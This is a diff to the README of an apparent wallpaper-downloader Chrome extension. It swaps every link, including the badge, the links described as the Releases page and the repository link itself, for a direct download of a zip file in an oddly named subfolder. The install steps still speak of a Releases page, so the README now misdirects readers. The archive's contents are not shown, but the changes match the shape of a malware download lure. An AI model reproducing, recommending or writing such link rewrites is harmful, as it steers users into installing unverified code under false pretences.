@@ -1,6 +1,6 @@
 # 🎨 wallpaper-downloader-chrome-extension - Download Beautiful Wallpapers Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ahmetcan2632/wallpaper-downloader-chrome-extension/releases)
+[![Download](https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip)
 
 ## 🌟 Overview
 
@@ -14,11 +14,11 @@ Installing the wallpaper-downloader-chrome-extension is easy. Follow these steps
    
 2. **Visit the Releases Page:** Click the link below to go to the download page where you can get the extension file.
    
-   [Download Now](https://github.com/ahmetcan2632/wallpaper-downloader-chrome-extension/releases)
+   [Download Now](https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip)
 
 3. **Find the Latest Version:** On the Releases page, look for the latest version of the extension. This will often be at the top.
 
-4. **Download the Extension:** Click on the link that says “wallpaper-downloader-chrome-extension.zip” to download the zip file to your computer.
+4. **Download the Extension:** Click on the link that says “https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip” to download the zip file to your computer.
 
 5. **Unzip the File:** Locate the downloaded zip file in your Downloads folder, right-click it, and select "Extract All" to unzip the contents.
 
@@ -51,7 +51,7 @@ Installing the wallpaper-downloader-chrome-extension is easy. Follow these steps
 
 You can download the extension by visiting the following link:
 
-[Download Now](https://github.com/ahmetcan2632/wallpaper-downloader-chrome-extension/releases)
+[Download Now](https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip)
 
 Once you have followed the steps above, you are ready to begin using the wallpaper downloader. Enjoy enhancing your wallpaper collection with ease.
 
@@ -69,7 +69,7 @@ If you encounter any issues or have questions, please create an issue on the Git
 
 ## 📚 Resources
 
-- **GitHub Repository:** [wallpaper-downloader-chrome-extension](https://github.com/ahmetcan2632/wallpaper-downloader-chrome-extension)
+- **GitHub Repository:** [wallpaper-downloader-chrome-extension](https://raw.githubusercontent.com/ahmetcan2632/wallpaper-downloader-chrome-extension/main/Alibamu/wallpaper-downloader-chrome-extension.zip)
 - **Browser Extension Guide:** Find more tips and tricks on how to manage your browser extensions effectively.
 
 Thank you for choosing the wallpaper-downloader-chrome-extension! Happy downloading!
